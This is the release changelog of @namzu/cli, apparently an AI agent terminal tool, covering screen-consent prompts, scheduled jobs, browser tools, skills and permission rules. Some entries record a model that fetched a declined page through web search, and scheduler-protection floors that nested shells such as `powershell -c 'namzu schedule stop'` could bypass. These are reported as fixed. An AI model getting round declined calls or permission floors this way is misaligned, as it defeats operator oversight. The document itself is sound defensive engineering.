# @namzu/cli

## 30.0.0

### Major Changes

- 82769f1: The interactive CLI now asks once per session before the model first sees your screen, and `strict` mode no longer lets a screenshot run on its own — that second part is why this is a major release for `@namzu/cli`. In `prompt`, `accept-edits` and `plan` mode the first `computer_use` call that would send the screen to the provider — a screenshot, a zoom, the list of open windows, a window's controls, or an action that returns a screenshot — opens a "Share your screen" box naming the provider; after a yes, later screenshots in that session run without asking, and clicks, typing and `ui_act` are still reviewed as before. A mode switch keeps the answer; a new session (`/new`, `/clear`, `/model`) asks again. `auto` never asks. **`strict` now refuses a screenshot unless a rule allows it**: to keep screenshots running in `strict`, add `permissions: { computer_use: 'allow' }` (which also allows clicks) or a narrower rule for the actions you want.

  Approving a `ui_act` call shows the control by name (`Press Button "Beş" (e30)`), and `ui_snapshot` as the window it reads.

  **`@namzu/sdk`**

  - `ToolDefinition.capturesScreen?(input)` and `defineTool({ capturesScreen })` declare which calls send the operator's screen to the model provider. `computer_use` declares its observations and every action followed by a screenshot.
  - **Breaking:** the authorization gate's `allow_read_only` rule (`allowReadOnlyTools: true`, in every shipped preset) no longer allows a call that declares `capturesScreen`; it goes to the review policy instead. With `createReviewHandler` and no `screenConsent` nothing changes (a screenshot is approved as a read); a custom `ResumeHandler` now sees `computer_use` screenshots, zooms, window lists and UI snapshots. To keep them out of review, add an explicit rule such as `{ type: 'allow_by_name', toolNames: ['computer_use'] }` (which allows clicks too).
  - `createReviewHandler` / `createReviewPolicy` take `screenConsent: { sessions: Set<string> }` and an optional `capturesScreen(name, input)` predicate (default: the tool's declaration from `registry`). With them, the first such batch in a session is put to `prompt` with the new `ToolReviewRequest.screenConsent: true`; `strict` refuses it unless a rule allowed it, `auto` does not ask, and without a `prompt` it is refused with the new `SCREEN_CONSENT_UNATTENDED_REFUSAL`. A no is `SCREEN_CONSENT_DECLINED_FEEDBACK`. New type `ScreenConsentRecord`. Without `screenConsent` nothing changes.

### Minor Changes

- 172fd9e: New `open_url` tool: in the interactive terminal and `namzu exec`, the model can open an http(s) page in your default browser (under WSL, the Windows browser) instead of guessing a shell command. It is a `network` tool, so `prompt` mode asks before it runs. Add a `[permissions]` rule for `open_url` to allow or deny it. `exec --json`, `drain`, ACP, scheduled runs and sub-agents do not have it. Each request in those two surfaces now carries about 120 more tokens of tool schema.
- 28102e1: The model can change a scheduled job instead of deleting and recreating it. The `schedule` tool has a new action, `update`: `job` names the job, and only the fields the model sets change (`prompt`, `when`, `folder`, `tz`, `budget`, or `permissions` as the whole new set, under the same limits as `create`). Asked whether it could change a job, a model with no such action deleted the job and created it again, and the job's history was lost.

  In the TUI the operator confirms every change on one screen: what changes first (the `-`/`+` lines `namzu schedule edit` shows), a `THE PERMISSIONS CHANGE` warning when a run's rules, `unmatched`, execution or browser grant change, then the job as it will run. `Cancel` is the default. `Save` writes the same job — its id, creation time and history kept — with the operator's new confirmation, keeps a paused job paused, and records `edited by tool` with the changes in its history. A change is refused if the job was changed while the operator was being asked. Like `create`, `update` is not preceded by the ordinary permission review in `prompt`, `accept-edits` and `auto`.

  SDK: `ScheduleToolHost` gains three optional methods, `previewUpdate(job, changes)`, `confirmUpdate(request, signal?)` and `update(preview)`, and new types `ScheduleJobChanges`, `ScheduleJobUpdateProposal` and `ScheduleUpdateRequest`. A host without them keeps working: the tool refuses `update` there and tells the model not to delete and recreate the job.

- 28102e1: A scheduled run that completed with refused tool calls now says so. A job whose only command was refused on every run was recorded `completed` each time, with a `finished` notification and nothing else to go on.

  A run now records `refusedCalls` (calls that never ran: a permission rule, the scheduled-run floor, `unmatched: deny`, a tool its permissions withhold) and `failedCalls` (calls that ran and returned an error), each `{ count, first: { tool, reason } }`, in its result file and history record, and as counts in the job state's `lastRun`. `namzu schedule list` shows `last completed (1 call refused)`, `show` and `history` print the first reason under the run, `run-now` prints it, and so do `/schedule` and the model's `schedule` tool `list`. The finished notification reads `done at …, but 1 call was refused (bash); namzu schedule show <job> says why`; the reason itself appears in the notification only for a job created with `--notify-summary`, because it can quote the command the model wrote.

  The run's status is unchanged: `completed` still means the turn ended normally, so failure counting, automatic pausing and which notification is sent behave as before. The new fields are additions to the `--json` output of `list`, `show` and `history`.

### Patch Changes

- 82769f1: Computer use no longer runs blind on a provider that cannot show the model an image in a tool result (OpenAI via API key, Bedrock, OpenRouter, LM Studio, Ollama, the generic HTTP driver). The `computer_use` tool is still listed, says why it cannot be used, and refuses every call; the desktop is never touched, and the session notices say `Computer use is unavailable in this session: …`. Use Anthropic, Codex or Google for computer use.

  Approving a `computer_use` call now shows each desktop action on its own line, in the order it will run, with any text to be typed shown in full.

- 28102e1: A scheduled run can no longer reach the scheduler through a shell the command-line reader does not follow. `powershell -c 'namzu schedule stop'`, `pwsh -command '…'`, `fish -c '…'`, `tcsh -c '…'` and `bash.exe -c '…'` were allowed whatever their text held: the scheduled-run floor took any shell at the head of a command with a `-c` option as read, but only the payloads of `sh`, `bash`, `dash`, `zsh`, `ksh`, `ash` and `mksh` (and `busybox` running one) are. Such text now goes through the floor's tripwire like any other text a program runs as code. A job whose commands use those shells without naming the scheduler, `NAMZU_HOME` or the browser profiles runs as before.

  SDK: new exports `nestedShellCommand(words)`, `NESTED_SHELLS` and the type `NestedShellCommand`. `nestedShellCommand` says, for one simple command's words (without its leading assignments), which `-c` payload `lexShellCommandLine` reads as a command line of its own, why it made the line opaque instead, or `null` when it reads none. The lexer uses it itself, so its reading is unchanged.

- 28102e1: A scheduled run may now run a command whose code merely mentions namzu. `powershell.exe -NoProfile -Command "[System.Windows.MessageBox]::Show('Namzu: scheduled job running','Namzu')"` was refused by the scheduled-run floor, because text passed to PowerShell, `cmd`, Python, Node or a shell reading its input was refused whenever it contained `namzu` or `schedul`. Such text is now refused only when it holds something that can reach the scheduler or `NAMZU_HOME`: a `schedule` subcommand other than `list`, `show`, `status`, `history` or `logs` with the CLI or an expansion in reach, the service's name (`namzu-scheduler…`, `com.namzu.…`), a service tool with a namzu name or a `*`, `pkill`/`killall`, `NAMZU_HOME` by name, `.namzu` as a path segment, a path into either protected folder, or `LOCALAPPDATA` with a `namzu` segment. A job that was refused for naming the product runs; nothing that reached the scheduler before is let through (checked against bash on 35 159 generated lines, and on 1 189 labelled lines of PowerShell, `cmd`, Python, Node and `sh` code).

  The refusal now says which rule matched and where (`` the argument `~/.namzu/x` names NAMZU_HOME (/home/you/.namzu) ``, `` … it holds `schedule stop` (a `namzu schedule` subcommand other than …), in the argument `namzu schedule stop`  ``) instead of listing everything the floor protects.

  SDK: a `predicate` authorization rule may carry `describe(call)`, asked after `decide` returned a decision; its answer is the gate's reason for that call instead of the rule's fixed `description` (a `null`, empty or thrown answer keeps `description`). `describeRule(rule, call?)` takes the call as an optional second argument. Both are additions; existing rules and callers are unchanged.

- 28102e1: In the TUI, the model's `schedule` tool now lists every scheduled job, not only those of the session's folder. A model that created a job in a folder below the session's and then called `list` was told "No scheduled jobs." while `namzu schedule list` showed the job, because the TUI's host filtered by folder unless the model passed `allFolders: true`, which models do not. Jobs of the session's own folder are marked `(this folder)` and are still the only ones whose prompt the model sees.

  SDK: `ScheduleJobSummary` gains an optional `inSessionFolder`, which the `schedule` tool prints as `(this folder)` on the job's `list` line. A host may use it to list every job regardless of `allFolders`. The tool still asks `host.list({ allFolders: false })` unless the model sets it, so a host that filters by folder behaves as before.

- 28102e1: A skill the model loads now names the directory its files are in (#536), so a skill whose instructions say `scripts/…` or `references/…` can be followed. On the host it is the directory the skill was read from. With `sandbox.enabled`, a skill under the working directory or an added directory gets the same path, which the sandbox mounts; every other skill (the user and shared-user tiers, the built-ins, `.agents/skills` above the working directory, user plugins, and every skill under an `ephemeral` workspace) is reported as not reachable instead of being given a host path the sandbox refuses. Nothing to do on upgrade.
- 28102e1: `namzu schedule status` on Windows and WSL now says what the Task Scheduler's last result means, keeping the number: `last result: running (267009, 0x41301)` instead of `last result 267009`. The result that appears every five minutes while the scheduler runs, `-2147020576` (0x800710E0), reads `an instance was already running, so a new one was not started; expected, since the task checks every five minutes`, so it is not mistaken for a failure. Task Scheduler's own codes, the common Windows errors and the scheduler's own exit codes are named; any other result shows its number and its hexadecimal form.
- 172fd9e: Under WSL, the Claude, Codex, Gemini and OpenCode sessions you are signed in to on Windows are now found even when `/etc/wsl.conf` moves the Windows drives (`[automount] root`). The paired Windows home used to be looked up only under `/mnt/c`. A scheduled run's `PATH` now also drops the Windows drive entries under that root, instead of only those under `/mnt/`. On the default `/mnt/` nothing changes.
- 172fd9e: Under WSL, several things now look for Windows programs under the drive mount root set in `/etc/wsl.conf` (`[automount] root`) rather than always under `/mnt/c`: the scheduler service's programs (`schtasks.exe`, `cmd.exe`, `powershell.exe`, …) and the directory they start in, Windows notifications, and the paths the model is told about. On a distro that moved the root, `namzu schedule install` used to refuse and notifications never appeared. On the default `/mnt/` nothing changes. A service installed while the root was elsewhere keeps the program paths recorded in its manifest. If you have since moved the root, reinstall it with `namzu schedule install`.
- 172fd9e: Under WSL, `namzu login` now opens the sign-in page in the Windows browser. It launches Windows PowerShell by absolute path, under the drive mount root set in `/etc/wsl.conf` (`[automount] root`, `/mnt/` by default), and the address is passed as data, never as script text. It used to call `xdg-open`, which under WSL usually opened nothing, so you had to copy the URL. When interop is off or PowerShell is missing, it still falls back to `xdg-open`. Nothing to change on your side.
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [82769f1]
- Updated dependencies [82769f1]
- Updated dependencies [82769f1]
- Updated dependencies [82769f1]
- Updated dependencies [82769f1]
- Updated dependencies [82769f1]
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [28102e1]
- Updated dependencies [82769f1]
- Updated dependencies [28102e1]
  - @namzu/anthropic@6.2.0
  - @namzu/sdk@46.0.0
  - @namzu/openai@4.1.1
  - @namzu/computer-use@2.0.0
  - @namzu/browser@0.1.0
  - @namzu/ollama@2.2.4
  - @namzu/openrouter@3.0.1

## 29.1.0

### Minor Changes

- 2b96136: The interactive terminal can drive a web browser. `@namzu/browser` is now a dependency, and the TUI mounts the `browser` and `browser_act` tools on a namzu-owned profile; in WSL they drive the Windows Chrome. Nothing launches until the model's first browser call. `namzu exec`, `exec --json`, `drain`, `acp` and the resident step do not get the tools.

  What changes for you:

  - **Browser calls are reviewed by default.** With no config, opening any site and every action on a page is reviewed (`"*": ask`); looking at the page the browser holds is not. Set `browser.sites` to allow sites (`read`, `act`) or refuse them (`deny`), or `browser.enabled: false` to turn the tools off.
  - **New config key `browser`** (`enabled`, `defaultProfile`, `engine`, `headless`, `sites`, `keepOpen`). An unreadable site key or level stops namzu from starting and names the key. The key is merged across files per site; a deny in any file holds. A project file that sets `browser.defaultProfile` is refused, and namzu will not start in that folder until the key is removed.
  - **Site rules come before your `[permissions]` table for the browser tools.** A table `deny` for `browser` or `browser_act` still wins; a table `allow` or `ask` for them applies only to `back`, `forward` and `reload`.
  - **New commands:** `namzu browser login <profile> [url]`, `list`, `status`, `install`, `remove`; the `/browser` slash command (status, `profile <name>`).
  - **`namzu doctor`** reports `browser.installed` and `browser.engine`. The boot capability line gains `browser yes|no`.
  - **The review screen** names the site rule, profile and engine for a browser call. A turn paused because a page needs you (sign-in, CAPTCHA) says where to do it and how to continue.
  - New exports: `browserInstalledCheck`, `browserEngineCheck`; `NAMZU_OPTIONAL_CAPABILITIES` includes `@namzu/browser`.

  See docs/cli/browser.md.

- 2b96136: The CLI ships three built-in skills and a way to make your own from the TUI.

  - `skill-creator` (model and operator), `browser-automation` (model only, offered only when the `browser` tool is present) and `schedule-task` (offered where the `schedule` tool is: the TUI). Every session now carries the `skill` tool and lists `skill-creator` in its skills manifest. To go back to no built-ins, set `skills.builtin: false`; to drop one, name it in `skills.disabled`; a skill of the same name in `~/.namzu/skills`, `~/.agents/skills` or the project replaces it.
  - `/skills new [what it should do]` starts an interview with the model, which drafts a `SKILL.md` and proposes it through the new `save_skill` tool. Nothing is written until you choose Save to user (`~/.namzu/skills`), Save to project (`./.namzu/skills`) or Cancel on a screen that shows the whole file with invisible characters revealed and names any skill it replaces. The screen asks in every permission mode, `auto` included; `plan` and `strict` refuse the tool. `save_skill` exists only in the interactive TUI, never in `exec`, `drain`, a scheduled run or a sub-agent. `/skills new` is now a subcommand, so a skill named `new` is activated from the `/skills` picker rather than by `/skills new`.
  - The skill tiers are read again at the start of every turn, so a skill added while a session runs is offered from the next turn.

- 2b96136: Scheduled jobs can drive the browser, on the sites you list and no others.

  - **New flags** on `namzu schedule add` and `edit`: `--browser <profile>`, `--browser-site <site>=read|ask|act` (repeatable) and `--browser-headed`; on `edit`, `<site>=none` takes a site off and `--no-browser` removes the grant. Sign in first with `namzu browser login <profile> <url>`. `*` is refused: every site not listed is denied. `ask` needs `--unmatched park`. A browser grant alone (no `--permissions`) needs `--unmatched`.
  - **New job field** `permissions.browser` (`profile`, `sites`, `headed`), covered by the confirmation. The model's `schedule` tool in the TUI can now propose it; you confirm it on screen.
  - **A job's `[permissions]` rules may no longer name `browser` or `browser_act`**; creating or editing such a job is refused with a pointer to the grant. Without a grant both tools are denied in a scheduled run, as before.
  - **A run with a grant checks its browser before the model**: the profile exists and has its data, the browser it was signed in with can start (WSL interop for the Windows browser), a display for `--browser-headed`. Otherwise it is `blocked-config` with the `namzu browser login` command.
  - **A run a page parked for you** (a sign-in, a CAPTCHA) reads `needs you: <reason>` in `schedule list`, `show`, `status`, `/schedule` and the TUI's startup line instead of "waiting for approval". `--json` gains `activeRun.handoff` (`list`) and `awaitingApproval[].handoff` and `waitingFor` (`status`).
  - The scheduled-run floor also refuses tool arguments naming the Windows browser's profile folder (`…/AppData/Local/namzu`, `%LOCALAPPDATA%\namzu`). A site a config file's `browser.sites` denies stays denied for every job.
  - `DISPLAY`, `WAYLAND_DISPLAY` and `XAUTHORITY` now reach a scheduled run's environment.

  See docs/cli/scheduled-tasks.md#browser-access.

- d233f26: Add scheduled jobs: prompts that run later in a folder while namzu is closed, under a permission set you write down, run by a scheduler service.

  New commands, all under `namzu schedule`: `add`, `edit`, `confirm`, `list`, `show`, `history`, `pause`, `resume`, `remove`, `run-now`, `prune`, `install`, `uninstall`, `status`, `start`, `stop`, `logs` and `daemon`. `install` registers a systemd user unit, a launchd agent or a Windows scheduled task (under WSL, a task that runs the daemon through `wsl.exe`). New config key `schedule` (`maxConcurrentRuns`, `notifications`), read from the user and managed files only. New files under `NAMZU_HOME/schedule/`. `namzu doctor` gains a `scheduler.service` check. `namzu upgrade` asks a running scheduler to restart on the new code.

  In the TUI: `/schedule` lists jobs and what needs you and acts on them, `/loop` re-sends a prompt to the open conversation on an interval between turns, the model gets a `schedule` tool (every job it proposes is confirmed by you on a screen namzu computes) and a `session_loop` tool, and one startup line reports scheduled work since you last looked.

  A job is confirmed on a terminal or in the TUI; `schedule add --yes` without a terminal (a script, or a model's own shell call) creates it inert. This is a tripwire, not a lock against a program running as you: see "Only a terminal or the TUI confirms a job" in the docs. A scheduled run never approves a call on its own: a call its rules do not allow is refused or parks for you, and you answer it later from `/resume` in the job's folder, under the job's rules. Allows come only from the job; every `deny` in your config files still holds.

  Wording only, no behaviour change: `namzu serve` now says namzu has no _server_ (it used to say no daemon, which the scheduler made untrue), and `namzu drain --help` no longer says namzu has no daemon. A script matching the old `serve` sentence must match the new one.

  See `docs/cli/scheduled-tasks.md` and `docs/cli/scheduler-service.md`.

- 2b96136: The interactive terminal now proposes saving a multi-step task as a skill. After a turn that answered with at least six successful tool calls across two or more tools (one of them changing something), it prints one dim line under the reply: `✻ That took 9 steps across 4 tools. Save it as a reusable skill? /skills save [name] · /skills save off to stop suggesting`. It appears at most once per conversation, takes no keys and costs no model call; nothing is saved unless you type `/skills save`, which drafts the skill in the same conversation and saves it only from the confirmation screen.

  To turn it off, type `/skills save off` (it writes `skills.suggest: false` to `~/.namzu/config.yaml`) or set that key yourself; `/skills save on` restores it. It also stops by itself after three proposals in a row go unused. `skills.suggestMinToolCalls` changes the threshold. `namzu exec`, `drain`, ACP, scheduled runs and sub-agents never show it.

- 2b96136: `SKILL.md` skills now reach the model on their own. Every session lists the usable skills in the prompt's skills manifest and mounts the `skill` tool, which the model calls to load one when a task matches its description; until now only plugin skills did, and a file skill needed `/skills <name>` or `exec --skills`. Skills are read from six tiers, the later shadowing the earlier: built-in (`skills/` in this package), `~/.agents/skills`, `~/.namzu/skills`, `./skills`, `.agents/skills` from the checkout root down to the working directory, and `./.namzu/skills`. The manifest is capped at 2% of the context window or 4 KB, whichever is smaller; skills that do not fit are named in one line and stay loadable.

  What may change for you:

  - A model working in a folder with skills now sees them and may load one. To keep a skill away from the model, add `disable-model-invocation: true` (or `invocation: operator`) to its frontmatter, or name it in the new `skills.disabled` config list; `skills.builtin: false` leaves the built-in tier out.
  - A skill whose `metadata.namzu-requires-tools` names a tool the session lacks is not offered.
  - `namzu skills-json` can now report `"source": "system"` for a built-in skill, and leaves disabled skills out. A host that switches on `source` should accept the new value.
  - `namzu skills` and `/skills list` show each skill's directory tier and the files it shadows; `namzu --format json skills` items gain `tier`, and `shadows`, `disabled`, `invocation` and `requiresTools` when they apply.

- 2b96136: Handles a tool's request for a person (`ToolResult.handoff`, see `@namzu/sdk`). The `paused` `AgentEvent` gains `handoff`. The terminal shows the reason with `press Enter to continue · Esc to stop`: Enter resumes the turn and Esc abandons it. `namzu exec` prints `Turn paused — needs you: <reason>`. A scheduled run paused this way records `awaiting-approval` with the reason (`reason` and the new `handoff.reason` in its run result), and its notification says `needs you: <reason>`. `namzu resume <session-id>` and `/resume` offer Continue or Abandon for such a run instead of a permission screen. Nothing to change on your side.

### Patch Changes

- 2b96136: The review screen reads a browser call in words. It was titled `browser` and asked "Do you want to run browser?" over `action: "navigate"`; it now says `Open a web page` / `Do you want to open this page?`, `Go back in the browser`, or `Click on https://shop.example` / `Do you want to do this on https://shop.example?`. An address opens with its path as a person writes it (`/wiki/İstanbul`) and, when that differs, the address actually sent (`/wiki/%C4%B0stanbul`) below it; the host stays in its punycode form.
- 2b96136: A generic tool result view may now set `outcome: 'cancelled'` for a call the person declined on the tool's own screen. `save_skill` and the `schedule` tool's `create`, `resume` and `delete` use it (the `schedule` tool also sets `data.cancelled` on those results), and the TUI shows the row as `○ … Cancelled — nothing was saved` instead of `✗ … failed: Error: The operator cancelled`. The model still receives the same refusal text.
- 2b96136: A tool call a person declines without giving a reason now tells the model not to get the same content or result another way — another tool, another site or address, or a web search — unless it asks first and the person agrees. The text was "User declined to run the proposed tool(s)." (and "The user rejected this tool call." on a resumed decision); in a live session a model whose browser navigation was declined fetched the same page through web search instead.

  New export: `DECLINED_TOOL_CALL_FEEDBACK`, the text. A host that passes its own `feedback` with a refusal is unchanged. A test or host that matched the old default text must match the new one.

- 2b96136: Continuing a turn a tool paused for a person — Enter at "The browser needs you", or Continue on a parked scheduled run — now tells the model that you dealt with it and to try the step again. It used to see only the tool's "needs a person" result and end the turn, so a scheduled post you had signed in again for was reported as not possible. The Continue/Abandon card for a scheduled run names the site, the profile and the sign-in command in words.
- 2b96136: A scheduled run the browser parked on a sign-in page says how to sign in again: its reason, and so the notification, `schedule list`, `show`, `status` and `/schedule`, read `… is showing a sign-in page; sign in again with namzu browser login <profile> <url>`.
- 2b96136: `/abandon`, `/resume` and Abandon on a parked scheduled run no longer print the turn's id. They say `Stopped the paused turn. Your next message starts a new one in this conversation.`, `Continuing where it paused…` and `Stopped this run. The job stays scheduled.` Nothing else changes.
- d233f26: The permission screen shows a shell command as it would be typed. It used to escape the command the way JSON does, so `printf '%s\n' "$out"` read as `printf '%s\\n' \"$out\"`. A multi-line command now shows one row per line, later lines indented under the first; a carriage return and other invisible characters are spelled out as `\u{....}`, and `d` still shows the exact input. Nothing to change on your side.
- 2b96136: A tool result whose first line is up to 300 characters long shows that line whole on its `⎿` row and not again underneath. It used to be cut at 120 characters on the row and repeated in full as the first line of the output below, so a blocked browser navigation's note appeared twice. A longer first line is still shortened on the row and kept whole in the output.
- 2b96136: A parked scheduled run whose job cannot run shell commands (`bash` denied, as in the `read-only` preset) can be continued from a TUI session whatever its sandbox setting. It used to be refused unless the session's sandbox matched the job's `execution`, which for a browser job created with `execution: sandbox` meant editing your config to continue it. A job that can run commands is still continued only from a matching session. The refusal now says a run a page parked "is waiting for you" rather than "waiting for approval".
- 2b96136: Esc or Ctrl+C on the screen that saves a skill now only cancels the save. It also interrupted the turn, so the model never heard that nothing was written.
- 2b96136: The `schedule` tool's input schema now says that `budget` limits one run and that `maxIterations` counts model steps, not repetitions of the job. A model proposed `maxIterations: 1` for a job meant to post once per run, and every run stopped after its first model call. The CLI's confirmation of a job, on a terminal or in the TUI, warns when it allows fewer than 10 iterations.
- 2b96136: `ScheduleToolHost.create()` may return an optional `note`, which the `schedule` tool appends to what the model is told about the new job. Existing hosts that return only `{ name }` are unaffected. The CLI uses it to tell the model that no scheduler is installed, so its reply no longer promises a run that cannot happen until you run `namzu schedule install`.
- 2b96136: A job the model proposes in the TUI and you create now says, when no scheduler is installed, that it will not run until `namzu schedule install`. `namzu browser login` ends by saying a scheduled job uses the profile with `namzu schedule add … --browser <profile>`.
- 2b96136: Confirming an edited scheduled job now lists what changed since it was last confirmed, as `+` and `-` lines above the question, in `namzu schedule edit`, `namzu schedule confirm` and `/schedule confirm`. An edit saved with `--yes` records the lines in the job's history (`changes` on the `edited` record in `schedule history --json`) so the later confirmation can show them.
- 2b96136: The `schedule` tool asks the model to leave optional fields (folder, time zone, execution, budget, a visible browser window) unset unless the user asked for them, and the TUI's confirmation of a proposed job marks every such value the model set that differs from what you would get by default, e.g. `Chosen by the model, not the default: time zone America/New_York, not this machine's Europe/Istanbul`.
- 2b96136: A job the model proposes, resumes or deletes in the TUI is confirmed once, on the job's own screen. The permission review no longer asks "Do you want to run schedule?" first in `prompt`, `accept-edits` or `auto`. `plan` and `strict` still refuse the call, a `schedule` rule of `ask` or `deny` still applies, and `pause` is still reviewed. The SDK's `schedule` tool no longer declares `delete` destructive, since the host confirms it before anything is removed; a host that relied on that flag to review deletes should add an `ask` rule for `schedule`.
- 2b96136: The `schedule` tool's input schema describes `budget.tokenBudget` as what the whole run may spend, with every model call resending the prompt, and the CLI's confirmation of a job warns when it allows fewer than 50 000 tokens. A model proposed 4 000 tokens for a browser job whose runs each took about 110 000.
- 2b96136: A parked scheduled run you approve or continue from the TUI is told the current local time again, since an answer can come long after the run started, and every time line now says it is the current time already looked up, so the model does not try to run `date` for it.
- 2b96136: A scheduled run is told the time it started, in the job's time zone with its UTC offset (`It is now Wednesday, 23 September 2026 at 21:04 GMT+03:00 (Europe/Istanbul)`). It had only the date; a job that wrote the time into a post, with no shell to ask, wrote the time in UTC.
- 2b96136: A scheduled run is no longer sent the tools its job can never use, which every model call used to resend. For a browser job that posts once to a site with the `read-only` preset and `--unmatched deny`, a run went from about 106 000 tokens to about 78 000. A tool withheld this way is refused as an unknown tool if the model names it anyway; nothing a job's rules allow is withheld. New `AgentSessionOptions.withheldTools`.
- 2b96136: The `skill` tool now presents its calls as `Read skill <name>` (or `List skills`) and hides a successful result, so a host shows one row instead of the raw input and the skill's body. In the TUI, the Working row says `Waiting for you` while the screen that saves a skill is open, instead of counting on as if the turn were working.
- 2b96136: `/skills save off` and `/skills save on` now warn when a project file, profile or managed config sets its own `skills` block that would override the value you just wrote to `~/.namzu/config.yaml`. The warning names that file and says what `skills.suggest` will be the next time namzu starts. Add `suggest` under `skills` in that file to make the change stick. `/skills save` and `/skills new` typed while a turn is running now wait and run when that turn ends, instead of being injected into it.
- 2b96136: The confirmation of a job the model proposes is shown whole again. When the model wrote a sentence along with the `schedule` call, the confirmation was drawn below that still-open reply and, taller than the screen, lost its top lines — the job, the model, the budget and its warnings — while you were asked to create it. A tool's own screen now closes the reply first.
- 2b96136: Skills drafted by `/skills save` and `/skills new`, job prompts the model proposes through the `schedule` tool, and a scheduled run's final summary now follow the language you write in (the job prompt's language for a run), instead of defaulting to English.
- 2b96136: While a question is waiting for you during a turn — a permission review, a scheduled job's confirmation, the Continue/Abandon card — the activity row reads "Waiting for you · the question below" instead of a running `Working` timer, and the time spent answering is not counted in the turn's elapsed time.
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [d233f26]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [d233f26]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
- Updated dependencies [2b96136]
  - @namzu/sdk@45.1.0
  - @namzu/browser@0.1.0

## 29.0.1

### Patch Changes

- 2e2ea14: A skill's `allowed-tools` now pre-approves its tools. It no longer restricts the tool set.

  The field comes from the Agent Skills format, and that format defines it this way: the listed tools skip the approval prompt for the rest of the turn that loaded the skill, and every other tool stays callable. Namzu read it the other way. After the `skill` tool loaded a skill, the next batch was narrowed to the listed tools and the model was told to "restrict yourself to" them. A skill with `allowed-tools: Read Grep` therefore took `bash` away, and the model stopped doing the work.

  **What breaks in `@namzu/sdk`**

  - A loaded skill no longer narrows `ToolContext.allowedTools`. If a host relied on `allowed-tools` to confine the model, it should narrow the turn itself with `QueryParams.allowedTools`, a step's `allowedTools`, or `deny` rules.
  - `ToolContext.adoptSkillScope` is deprecated. The kernel never supplies it, so a tool that calls it through `?.` now does nothing. It will be removed in the next major. Use `ToolContext.grantSkillTools`.
  - `createReviewHandler` / `createReviewPolicy` in `prompt` and `accept-edits` modes now approve a batch without asking when every call it would ask about is covered by a skill loaded earlier in the turn. To keep asking about every call, pass `skillGrants: 'ignore'`. `plan` and `strict` still refuse such calls, and an operator `deny` or `ask` rule, a destructive call, or a path outside the roots or the sandbox is never covered. Each approval made this way is written to the audit trail under the skill's name.
  - The `bash` tool runs `bash -c` instead of `/bin/sh -c` wherever bash exists (the first `bash` on `PATH`, then `/bin/bash`, then `/usr/bin/bash`), including for background jobs. On a host whose `/bin/sh` is `dash` or `busybox sh` (Debian, Ubuntu, Alpine), commands now run in bash; a command that relied on `dash` behaviour, such as `echo` expanding `\n`, behaves as bash does. `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS` and `BASH_FUNC_*` are removed from its environment. To keep `/bin/sh`, set `NAMZU_BASH_SHELL=/bin/sh` in the environment of the process that runs the SDK. In a sandbox the tool now passes the guest `/bin/sh -c '<launcher>' sh '<command>'`, which runs bash when the guest has it; a custom `Sandbox.exec` or `spawnDetached` that inspected its arguments for `['-c', command]` sees the launcher instead. With no bash, the host still runs `/bin/sh -c`.
  - A command line is read for the shell that runs it. `AuthorizationGate.evaluate`, `evaluateRule` and `SkillGrantSet.coveringSkill` called without a dialect read it for any POSIX shell (`sh`), so an allow rule or `Bash(<pattern>)` entry no longer approves a line using a bash-only construct (`$'…'`, `&>`, `|&`, `<<<`, `[[`, arrays, brace expansion, `time` and others) unless the caller says the shell is bash. The kernel says so for the `bash` tool on a host that has bash; inside a sandbox it reads in `sh`, because the guest may not have bash. A host calling the gate itself passes `commandDialect: 'bash'` in the `ToolCallContext` (or `{ commandDialect: 'bash' }` as the last argument of `evaluateRule` and `coveringSkill`) when the command will run in bash. Deny rules are unaffected: they still see every command.
  - `parseAllowedTools` splits on whitespace as well as commas, and keeps `Tool(pattern)` entries whole. `"read write edit"` used to be one name and is now three.
  - The skill manifest in the system prompt renders the field as `<pre_approved_tools>` instead of `<allowed_tools>`. The `skill` tool's notice lists what was pre-approved and what was ignored, and says every other tool remains available.

  **Added:** `ToolDefinition.commandDialect` (and the `defineTool` option), `ToolCallContext.commandDialect`, `EvaluateRuleOptions`, the `ShellDialect` type, and `NAMZU_BASH_SHELL`; `ToolContext.grantSkillTools`, `ToolCallSummary.skillGrant`, `approve_tools.skillGranted`, `ReviewPolicyOptions.skillGrants`, `SkillGrantSet`, `compileSkillGrant`, `SKILL_TOOL_NAME_ALIASES`, `permissionPatternToRegExpSource`, and a `FrontmatterOptions` third argument to `parseFrontmatter` (`lists`), which the skill loader uses so that `allowed-tools` can be a YAML list. Names are matched case-insensitively and through the format's aliases (`Read` → `read`, `WebFetch` → `web_fetch`). `Bash(git status *)` uses the CLI permission-table glob, applied to each command in the line. `${CLAUDE_SKILL_DIR}` and `${NAMZU_SKILL_DIR}` expand to the skill's directory. An unknown name is ignored and reported, and never widens the grant. A tool that is destructive for every input (the shipped `write` and `run_code`) is ignored and reported too, because each of its calls is reviewed anyway. `BashOutput`, `KillShell`, `TaskOutput` and `TaskStop` map to `job`, and `TaskCreate`, `TaskUpdate` and `TaskList` to `task_*`. `ToolContext.grantSkillTools` returns a `commit()`, and the `skill` tool records the grant only once it has delivered the skill's instructions. The grant also ends when the operator sends a message while the turn is still running (`inboundMessages` or steering), through the new `SkillGrantSet.clear()`. A `Bash(<pattern>)` entry never covers a line that redirects output into a file (`git status > ~/.bashrc`); `/dev/null` and `2>&1` stay covered. A whole-tool `Bash` entry grants the tool as it is, writes outside the working directory included, because bash has no path argument for the escalation check. An entry naming a tool that `allowedTools` withholds from the turn or step is ignored as not available, and `SkillGrantToolResolver` gains an optional `unavailable` field for that.

  **`@namzu/cli`:** a plugin skill's `allowed-tools` pre-approves for the turn and no longer takes tools away. `SKILL.md` files whose `allowed-tools` is a YAML list are now listed instead of refused. The `[permissions]` glob now comes from the SDK, and it matches the same commands as before. `permissionChecks` read a builtin tool's command line in the dialect that tool reports, as the runtime does.

- Updated dependencies [2e2ea14]
